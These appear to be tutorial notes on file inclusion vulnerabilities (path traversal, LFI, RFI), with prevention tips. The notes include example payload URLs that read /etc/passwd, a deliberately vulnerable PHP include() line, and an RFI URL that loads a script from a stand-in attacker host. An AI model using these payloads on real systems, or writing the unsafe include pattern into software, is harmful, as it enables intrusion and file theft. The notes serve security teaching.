# File Inclusion Vulnerabilities

1. What is File Inclusion?
File inclusion vulnerabilities occur when an application allows users to include files in a request. These can lead to Local File Inclusion (LFI) or Remote File Inclusion (RFI), depending on whether the included file is local or external. Attackers use these vulnerabilities to gain unauthorized access to files or execute malicious code.

2. Path Traversal
Path traversal (or directory traversal) enables attackers to access files outside the intended directory by manipulating the URL. For instance, by using sequences like ../.., they can move up directories and potentially access sensitive files, such as /etc/passwd in Unix systems.

Example:
```
http://webapp.thm/get.php?file=../../../../etc/passwd
```
3. Local File Inclusion (LFI)
LFI vulnerabilities let attackers load files from the web server itself. Developers often unintentionally introduce these when using functions like include() in PHP. If there is no validation, attackers can load sensitive files by injecting the file path directly into parameters.

- Example:
```
<?php include($_GET['lang']); ?>
```

An attacker could exploit this with:

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```

4. Remote File Inclusion (RFI)
RFI allows loading of files from external servers. If the application permits URLs in file includes, attackers can inject malicious scripts hosted on their own servers to execute on the target web server, potentially leading to Remote Code Execution (RCE).

Example:

```
http://webapp.thm/get.php?file=http://attacker.thm/malicious.php
```

5. Why File Inclusion Vulnerabilities Occur
These vulnerabilities often result from poor validation of user input in languages like PHP. If user inputs are not sanitized, attackers can manipulate parameters to load unintended files or execute commands.

6. Risks of File Inclusion

- Data Leakage: Access to configuration files, credentials, and sensitive data.
- RCE: Remote Code Execution if the application loads and runs malicious external files.
- System Access: Attackers can exploit LFI/RFI for further penetration into the system.

### Prevention Tips
To prevent file inclusion vulnerabilities:

- Keep software updated.
- Disable PHP error messages to avoid disclosing file paths.
- Use a Web Application Firewall (WAF) to block malicious requests.
- Disable risky PHP functions like allow_url_fopen and allow_url_include.
- Validate user input rigorously and avoid allowing users to define file paths directly.
- Implement whitelisting for files and directories that the application can access.











